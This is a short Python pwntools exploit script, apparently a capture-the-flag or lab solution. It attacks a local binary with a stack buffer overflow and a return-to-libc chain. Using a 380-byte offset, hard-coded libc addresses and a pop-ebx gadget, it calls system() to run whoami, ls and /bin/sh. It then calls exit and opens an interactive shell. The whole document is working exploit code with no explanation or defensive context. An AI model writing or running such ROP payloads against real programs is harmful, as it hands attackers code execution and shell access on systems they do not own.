from pwn import *

elf = ELF('./binary')
p = process('./binary')

system_addr = 0xf7dcdcd0
exit_addr   = 0xf7dc01f0
gadget_addr = 0x08049022  # pop ebx ; ret

whoami_str = 0x0804a018
ls_str     = 0x0804a010
sh_str     = 0x0804a008

offset = 380

payload  = b"A" * offset

# system("/usr/bin/whoami")
payload += p32(system_addr)
payload += p32(gadget_addr)
payload += p32(whoami_str)

# system("/bin/ls")
payload += p32(system_addr)
payload += p32(gadget_addr)
payload += p32(ls_str)

# system("/bin/sh")
payload += p32(system_addr)
payload += p32(gadget_addr)
payload += p32(sh_str)

# exit(0x171)
payload += p32(exit_addr)
payload += p32(0x41414141)     
payload += p32(0x171)          

p.sendline(payload)
p.interactive()
